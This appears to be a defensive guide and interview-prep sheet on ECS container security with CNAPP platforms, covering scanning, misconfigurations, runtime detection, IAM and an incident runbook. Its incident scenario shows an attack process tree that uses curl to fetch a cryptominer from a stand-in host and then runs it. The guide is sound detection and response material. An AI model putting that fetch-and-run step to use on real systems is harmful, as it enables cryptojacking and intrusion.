# 🐳 ECS & Container Security in CNAPP — Complete Guide

> **Context:** How a Cloud Security Analyst manages AWS ECS (Fargate + EC2) and containers
> using CNAPP platforms like CrowdStrike Falcon, Wiz, and Prisma Cloud.

---

# PART 1: ECS ARCHITECTURE — What You're Protecting

```
ECS DEPLOYMENT MODELS:

┌──────────────────────────────────────────────────────────────────────┐
│                          AWS ECS CLUSTER                              │
│                                                                       │
│   MODEL 1: ECS on EC2 (You manage the host)                         │
│   ┌──────────────────────────────────────────┐                       │
│   │  EC2 Instance (Host)                      │                       │
│   │  ├── ECS Agent (manages tasks)            │                       │
│   │  ├── Docker Daemon                        │                       │
│   │  ├── Falcon Sensor (YOUR security agent)  │  ← Agent-based CWPP  │
│   │  │                                        │                       │
│   │  │  ┌──────────┐  ┌──────────┐           │                       │
│   │  │  │  Task A   │  │  Task B   │          │                       │
│   │  │  │ Container │  │ Container │          │                       │
│   │  │  │ Container │  │ Container │          │                       │
│   │  │  └──────────┘  └──────────┘           │                       │
│   │  └────────────────────────────────────────│                       │
│   └──────────────────────────────────────────┘                       │
│                                                                       │
│   MODEL 2: ECS on Fargate (AWS manages the host — serverless)        │
│   ┌──────────────────┐  ┌──────────────────┐                         │
│   │  Fargate Task A   │  │  Fargate Task B   │                        │
│   │  ┌──────────────┐ │  │  ┌──────────────┐ │                        │
│   │  │  Container 1  │ │  │  │  Container 1  │ │  ← No host access   │
│   │  │  Container 2  │ │  │  │  Container 2  │ │  ← Agentless OR     │
│   │  └──────────────┘ │  │  └──────────────┘ │ │     sidecar sensor  │
│   └──────────────────┘  └──────────────────┘                         │
│                                                                       │
│   SERVICE: Runs N desired tasks, handles scaling, load balancing      │
│   TASK DEFINITION: Blueprint (image, CPU, memory, IAM role, ports)    │
│   TASK: Running instance of a Task Definition                         │
│   CONTAINER: A single Docker container inside a Task                  │
└──────────────────────────────────────────────────────────────────────┘
```

### Key Difference for Security:

| Aspect | ECS on EC2 | ECS on Fargate |
|--------|-----------|----------------|
| **Host visibility** | Full — you own the EC2 | None — AWS manages host |
| **Sensor deployment** | Install Falcon agent on EC2 (like any Linux host) | Sidecar container or agentless snapshot scanning |
| **Runtime detection** | Full eBPF-based process/network/file monitoring | Limited without sidecar; agentless = periodic scan |
| **Patching** | You patch the EC2 AMI + container images | You patch container images only; AWS patches host |
| **Privileged access** | Possible (and risky) | Blocked by design — Fargate doesn't allow privileged |

---

# PART 2: CNAPP COVERAGE FOR ECS — What the Platform Sees

## 2.1 Asset Discovery & Inventory

```
WHAT CNAPP DISCOVERS AUTOMATICALLY:

When you register your AWS account in the CNAPP tool:

├── ECS Clusters
│   ├── Cluster Name, Region, Account ID
│   ├── Launch Type (EC2 vs Fargate)
│   └── Number of Services, Tasks, Containers
│
├── ECS Services
│   ├── Service Name, Desired Count, Running Count
│   ├── Load Balancer attached?
│   ├── Auto-scaling policies
│   └── Deployment configuration
│
├── Task Definitions
│   ├── Family, Revision Number
│   ├── Container Images used (registry + tag)
│   ├── IAM Task Role (what permissions does this task have?)
│   ├── IAM Task Execution Role (what can ECS agent do?)
│   ├── Network Mode (awsvpc, bridge, host)
│   ├── Logging configuration (CloudWatch, FireLens)
│   └── Secrets / Environment Variables
│
├── Running Tasks
│   ├── Task ARN, Status, Started At
│   ├── Container Instance (if EC2 launch type)
│   ├── ENI / Private IP (if awsvpc mode)
│   └── Each container's image digest, status, health
│
└── Container Images
    ├── Image URI (e.g., 123456.dkr.ecr.us-east-1.amazonaws.com/app:v2.1)
    ├── Scan Results (CVEs, malware, secrets, misconfigs)
    ├── Base image lineage
    └── Running vs Registry-only status
```

## 2.2 The Five Security Pillars for ECS in CNAPP

```
┌─────────────────────────────────────────────────────────────────┐
│                ECS SECURITY IN CNAPP — 5 PILLARS                 │
│                                                                   │
│   ┌────────────┐  ┌────────────┐  ┌────────────┐               │
│   │ 1. IMAGE    │  │ 2. CONFIG  │  │ 3. RUNTIME │               │
│   │ SCANNING    │  │ POSTURE    │  │ PROTECTION │               │
│   │ (Pre-deploy)│  │ (CSPM)     │  │ (CWPP)     │               │
│   └─────┬──────┘  └─────┬──────┘  └─────┬──────┘               │
│         │                │                │                       │
│   ┌─────▼──────┐  ┌─────▼──────┐                               │
│   │ 4. IDENTITY│  │ 5. NETWORK │                               │
│   │ (CIEM)     │  │ VISIBILITY │                               │
│   └────────────┘  └────────────┘                               │
└─────────────────────────────────────────────────────────────────┘
```

---

# PART 3: PILLAR BY PILLAR — How You Manage ECS Security

## 3.1 IMAGE SCANNING (Shift-Left + Continuous)

```
WHERE IN TOOL:
├── CrowdStrike: Vulnerabilities → Image Assessments
├── Wiz: Vulnerabilities → Container Images
├── Prisma: Compute → Images

WHAT IT SCANS:
├── OS packages (apt/yum)              → CVEs from NVD
├── Application libraries (npm/pip/go) → CVEs + license issues
├── Secrets in layers                  → hardcoded API keys, passwords
├── Malware                            → known malicious binaries
├── Dockerfile misconfigs              → USER root, no HEALTHCHECK
└── Base image freshness               → outdated base? known vuln?

TWO SCANNING POINTS:

  1. ECR REGISTRY SCANNING (at rest):
     ├── CNAPP connects to your ECR registry
     ├── Scans every image on push (or scheduled)
     ├── Flags: 12 Critical CVEs in nginx:1.19 base image
     └── Action: Block deployment via CI/CD gate or admission policy

  2. RUNTIME IMAGE ASSESSMENT (in production):
     ├── CNAPP checks RUNNING tasks/containers
     ├── Compares: "image used in production" vs "scan results"
     ├── Flags: Task abc123 is running image with CVE-2024-XXXX
     └── Priority: Running + Critical + Internet-facing = IMMEDIATE
```

### 🔧 YOUR DAILY WORKFLOW — Image Scanning

```
MORNING CHECK:
1. Open CNAPP → Image Assessments → Filter: Severity = Critical, Status = Running
2. For each Critical image:
   ├── Is a patched version available? → YES → Create ticket for image rebuild
   ├── Is the CVE actively exploited (CISA KEV)? → YES → Emergency SLA (4 hours)
   ├── Is the task internet-facing (behind ALB)? → YES → Escalate priority
   └── No patch available? → Apply compensating control (WAF rule, restrict SG)

3. Track in ServiceNow:
   ├── Ticket: "Rebuild nginx image to patch CVE-2024-XXXX"
   ├── Owner: Application team (from CMDB)
   ├── SLA: 24 hours (Critical, internal)
   └── Verify: After rebuild, confirm new image scans clean
```

## 3.2 CONFIGURATION POSTURE (CSPM for ECS)

### Common ECS Misconfigurations the CNAPP Detects:

| # | Misconfiguration (IOM) | Severity | CIS/NIST Mapping | Remediation |
|---|----------------------|----------|-------------------|-------------|
| 1 | **Task Definition uses `privileged: true`** | 🔴 Critical | CIS ECS 5.4 | Remove `privileged` flag. Use specific Linux capabilities instead. |
| 2 | **Task Role has `*:*` (admin) permissions** | 🔴 Critical | AC-6 (Least Privilege) | Scope IAM policy to specific actions and resources. |
| 3 | **No logging configured** (no CloudWatch/FireLens) | 🟠 High | AU-2, AU-12 | Add `logConfiguration` in task def with `awslogs` driver. |
| 4 | **Secrets passed as environment variables** | 🟠 High | SC-28 | Use AWS Secrets Manager or SSM Parameter Store with `secrets` block. |
| 5 | **Container running as root (`user: root`)** | 🟠 High | CIS ECS 5.9 | Set `user` to non-root UID in task definition or Dockerfile. |
| 6 | **`readonlyRootFilesystem` not enabled** | 🟡 Medium | CM-7 | Set `readonlyRootFilesystem: true` in container definition. |
| 7 | **ECS Exec enabled on production service** | 🟡 Medium | AC-17 | Disable `executeCommandConfiguration` in prod (enable in dev only). |
| 8 | **Bridge network mode used (not awsvpc)** | 🟡 Medium | SC-7 | Switch to `awsvpc` for per-task ENI and Security Group isolation. |
| 9 | **No resource limits (CPU/memory not set)** | 🟡 Medium | CM-6 | Set `cpu` and `memory` in task definition to prevent noisy-neighbor. |
| 10 | **ECR image scanning not enabled** | 🟡 Medium | RA-5 | Enable `ScanOnPush` in ECR repository settings. |
| 11 | **Task Execution Role too permissive** | 🟠 High | AC-6 | Restrict to `ecr:GetAuthorizationToken`, `logs:CreateLogStream` only. |
| 12 | **No VPC endpoint for ECR (pulling over internet)** | 🟡 Medium | SC-7 | Create VPC endpoints for `ecr.api`, `ecr.dkr`, and `s3`. |

### 🔧 YOUR WEEKLY WORKFLOW — Posture Review

```
EVERY MONDAY:
1. Open CNAPP → CSPM → Filter: Service = ECS, Severity = Critical + High
2. Review new IOMs since last week
3. For each:
   ├── Validate: Is this a true misconfiguration? (check task def in console)
   ├── Assign: Route to the team that owns the ECS service (via CMDB)
   ├── SLA: Critical = 24h, High = 48h, Medium = 7 days
   └── Track: Create/update ServiceNow ticket
4. Update Power BI dashboard with ECS-specific posture metrics
```

## 3.3 RUNTIME PROTECTION (CWPP for ECS)

```
HOW CWPP WORKS ON ECS:

ECS on EC2:
├── Falcon sensor installed on the EC2 host (same as any Linux machine)
├── eBPF hooks intercept ALL system calls across ALL containers on that host
├── The sensor sees every process, file write, and network connection
├── Detection examples:
│   ├── Container spawns /bin/bash → "InteractiveContainerSession"
│   ├── curl downloads binary to /tmp → "ContainerDrift.NewExecutable"
│   ├── Process connects to known C2 IP → "SuspiciousNetworkConnection"
│   └── Container reads /proc/1/cgroup → "ContainerEscapeAttempt"

ECS on Fargate:
├── NO host access → cannot install traditional agent
├── OPTIONS:
│   ├── Option A: Sidecar Container
│   │   ├── Add Falcon sensor as a sidecar container in the Task Definition
│   │   ├── Shares PID namespace with application container
│   │   ├── Provides runtime visibility similar to EC2 mode
│   │   └── Trade-off: adds ~50MB memory overhead per task
│   │
│   ├── Option B: Agentless Snapshot Scanning
│   │   ├── CNAPP takes periodic snapshots of the Fargate task's filesystem
│   │   ├── Scans for vulnerabilities, malware, secrets
│   │   ├── No runtime behavioral detection (no process trees)
│   │   └── Trade-off: periodic (not real-time), no live threat detection
│   │
│   └── Option C: Cloud-Native Detection (GuardDuty ECS Runtime Monitoring)
│       ├── AWS GuardDuty has native ECS runtime monitoring (2024+)
│       ├── AWS manages a sidecar agent automatically
│       ├── Detects: crypto mining, malware, privilege escalation
│       └── Findings flow into Security Hub → your CNAPP ingests them
```

### 🔧 INCIDENT SCENARIO — Compromised ECS Task

```
SCENARIO: CNAPP fires a "CryptominingActivity" alert on an ECS task.

STEP 1: IDENTIFY (0-5 min)
├── Open CNAPP → Detections → filter by ECS cluster
├── Alert: Task arn:aws:ecs:us-east-1:123:task/prod-cluster/abc123
├── Process tree: java → /bin/sh → curl http://evil.com/miner → ./xmrig
├── This is a web application container that should NOT run shell or curl
└── Verdict: TRUE POSITIVE

STEP 2: CONTAIN (5-15 min)
├── Stop the task:
│   aws ecs stop-task --cluster prod-cluster --task abc123 \
│     --reason "Security: cryptomining detected"
├── Scale down the service temporarily:
│   aws ecs update-service --cluster prod-cluster \
│     --service web-app --desired-count 0
├── Restrict the Security Group (if awsvpc mode):
│   aws ec2 revoke-security-group-egress --group-id sg-xxx \
│     --ip-permissions IpProtocol=-1,IpRanges=[{CidrIp=0.0.0.0/0}]
└── If EC2 launch type: also cordon the EC2 instance

STEP 3: INVESTIGATE (15-60 min)
├── How did attacker get in?
│   ├── Check: Was the container image itself compromised? (supply chain)
│   ├── Check: Was there an application vulnerability? (RCE in Java app)
│   ├── Check: Was the Task Role credential stolen? (check CloudTrail)
│   └── Check: Was ECS Exec used to get a shell? (CloudTrail: ExecuteCommand)
├── What did the attacker do?
│   ├── Check: Network connections (was data exfiltrated?)
│   ├── Check: CloudTrail for API calls using the Task Role
│   └── Check: Did they access other AWS services (S3, SecretsManager)?

STEP 4: ERADICATE
├── If supply chain: remove malicious image, scan all images in ECR
├── If app vuln: patch the vulnerability, rebuild image
├── Rotate all secrets the task had access to
├── Rotate the Task Role credentials (update trust policy)
└── Update ECR scan policy to scan on every push

STEP 5: RECOVER
├── Deploy clean image version
├── Scale service back to desired count
├── Monitor closely for 72 hours
└── Verify Falcon sensor / GuardDuty coverage on all tasks

STEP 6: POST-INCIDENT
├── Was ECS Exec enabled in production? → DISABLE IT
├── Was the Task Role overly permissive? → SCOPE IT DOWN
├── Were image scans catching the malicious layer? → TUNE SCANNING
├── Add KPI: "ECS tasks with admin-level Task Roles" → TRACK IT
└── Write incident report, update runbook
```

## 3.4 IDENTITY (CIEM for ECS)

```
ECS IAM MODEL:

┌──────────────────────────────────────────────────────┐
│  Task Definition                                       │
│                                                        │
│  Task Execution Role ──► WHAT ECS AGENT CAN DO:       │
│  │ • Pull image from ECR                               │
│  │ • Send logs to CloudWatch                           │
│  │ • Fetch secrets from SSM/SecretsManager             │
│  │ ⚠️ Should be narrow (read-only for secrets + ECR)   │
│  │                                                     │
│  Task Role ──► WHAT YOUR APPLICATION CODE CAN DO:     │
│  │ • Access S3 buckets                                 │
│  │ • Read DynamoDB tables                              │
│  │ • Call other AWS APIs                               │
│  │ ⚠️ This is what attackers steal! Must be least priv │
│  │                                                     │
│  ⚠️ COMMON MISTAKE:                                    │
│  │ Giving the Task Role "AdministratorAccess"          │
│  │ because "it was easier during dev."                  │
│  │ → CIEM catches this and flags it as CRITICAL        │
└──────────────────────────────────────────────────────┘

CIEM CHECKS FOR ECS:
├── Task Role has unused permissions? → OVERPRIVILEGED → Recommend scoped policy
├── Task Role can assume other roles? → LATERAL MOVEMENT RISK → Flag
├── Task Role can access sensitive S3? → DATA EXPOSURE → Validate business need
├── Execution Role can read ALL secrets? → SECRET EXPOSURE → Scope to specific ARNs
└── Multiple services share the same Task Role? → BLAST RADIUS → Isolate per-service
```

## 3.5 NETWORK VISIBILITY

```
CNAPP NETWORK VIEW FOR ECS:

┌─────────────────────────────────────────────────────────────┐
│                    ECS NETWORK MAP                            │
│                                                               │
│   Internet                                                    │
│      │                                                        │
│      ▼                                                        │
│   ┌─────────┐    ┌─────────────────────────────┐             │
│   │   ALB   │───►│  ECS Service: web-frontend   │             │
│   └─────────┘    │  SG: allow 443 from ALB only  │             │
│                  └──────────┬────────────────────┘             │
│                             │ port 8080                       │
│                  ┌──────────▼────────────────────┐             │
│                  │  ECS Service: api-backend      │             │
│                  │  SG: allow 8080 from frontend  │             │
│                  └──────────┬────────────────────┘             │
│                             │ port 5432                       │
│                  ┌──────────▼────────────────────┐             │
│                  │  RDS PostgreSQL                 │             │
│                  │  SG: allow 5432 from backend    │             │
│                  └────────────────────────────────┘             │
│                                                               │
│   CNAPP SHOWS:                                                │
│   ├── Which tasks are internet-facing (behind ALB/NLB)        │
│   ├── Which tasks communicate internally (east-west traffic)  │
│   ├── Unexpected connections (task → unknown external IP)      │
│   └── Tasks with SG allowing 0.0.0.0/0 egress (data exfil)   │
└─────────────────────────────────────────────────────────────┘
```

---

# PART 4: ECS vs EKS — CNAPP Comparison

| Aspect | ECS | EKS (Kubernetes) |
|--------|-----|-----------------|
| **Admission Control** | No native equivalent; use CI/CD gates + IAM | KAC / OPA Gatekeeper |
| **Pod Security Standards** | N/A — controlled via Task Definition | PSS via namespace labels |
| **Runtime Agent** | Falcon on EC2 host / sidecar on Fargate | DaemonSet on all nodes |
| **Network Policy** | Security Groups per task (awsvpc mode) | Kubernetes NetworkPolicies + SGs |
| **RBAC** | IAM Task Roles | Kubernetes RBAC + IAM (IRSA) |
| **Image Gating** | ECR scan-on-push + CI/CD pipeline block | KAC image assessment policy |
| **Drift Detection** | Agent-based (EC2) or agentless (Fargate) | eBPF DaemonSet on every node |
| **CSPM Coverage** | ✅ Full (API-based) | ✅ Full (API + K8s API) |
| **CIEM Coverage** | Task Role + Execution Role analysis | IRSA + ServiceAccount analysis |

---

# PART 5: INTERVIEW ANSWERS FOR ECS + CNAPP

### Q: "How do you secure ECS services using CNAPP?"

> "I apply a five-pillar approach. **First, Image Scanning** — every image pushed to ECR is scanned for CVEs, secrets, and malware. Critical findings block deployment via CI/CD. **Second, Configuration Posture** — CSPM continuously audits task definitions for misconfigurations like privileged mode, root user, missing logging, or overly permissive IAM roles. **Third, Runtime Protection** — on EC2 launch type, the Falcon sensor monitors all container processes via eBPF; on Fargate, we use a sidecar sensor or GuardDuty ECS Runtime Monitoring. **Fourth, Identity** — CIEM analyzes Task Roles and Execution Roles for least privilege violations and lateral movement risks. **Fifth, Network** — we map all east-west and north-south traffic to detect unexpected connections or exfiltration patterns."

### Q: "How do you handle ECS on Fargate where you can't install an agent?"

> "Fargate is serverless — you don't own the host, so traditional DaemonSet agents don't apply. I use three complementary approaches: **One**, sidecar sensor — add the CrowdStrike Falcon container as a sidecar in the Task Definition sharing the PID namespace for runtime visibility. **Two**, agentless scanning — the CNAPP takes periodic filesystem snapshots to detect vulnerabilities and secrets without any agent. **Three**, AWS GuardDuty ECS Runtime Monitoring — since 2024, GuardDuty provides native Fargate runtime detection via an AWS-managed sidecar. The combination gives us vulnerability visibility (agentless), behavioral detection (sidecar or GuardDuty), and posture compliance (CSPM via API)."

### Q: "A Critical CVE is found in a running ECS production task. Walk me through your response."

> "**Hour 0-1:** I verify the CVE — is there a public exploit? Is the task internet-facing? Is the Task Role sensitive? If all three are yes, this is a P1. **Hour 1-4:** I check ECR for a patched image version. If available, I coordinate with the app team to deploy the updated task definition. ECS performs a rolling update — new tasks spin up with the clean image, old tasks drain. Zero downtime. **If no patch exists:** I apply compensating controls — restrict the ECS Security Group, add a WAF rule if it's behind an ALB, or reduce the Task Role permissions to limit blast radius. **Post-fix:** I verify the new tasks are running the patched image, close the ServiceNow ticket, and update our vulnerability dashboard."
